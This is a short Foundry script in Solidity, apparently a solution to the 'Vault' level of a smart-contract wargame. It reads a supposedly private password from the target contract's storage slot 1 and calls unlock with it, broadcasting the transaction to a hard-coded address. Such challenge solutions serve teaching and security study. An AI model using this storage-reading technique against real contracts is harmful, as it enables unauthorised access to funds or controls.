// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/8-Vault.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Vault vault = Vault(0x125F26247D72C135086A65f36B892aF43d0E0B8f);

    function run() external{
        vm.startBroadcast();

        // Read value in Vault's storage slot 1
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));

        // Unlock vault with password from storage
        vault.unlock(password);

        vm.stopBroadcast();
    }
}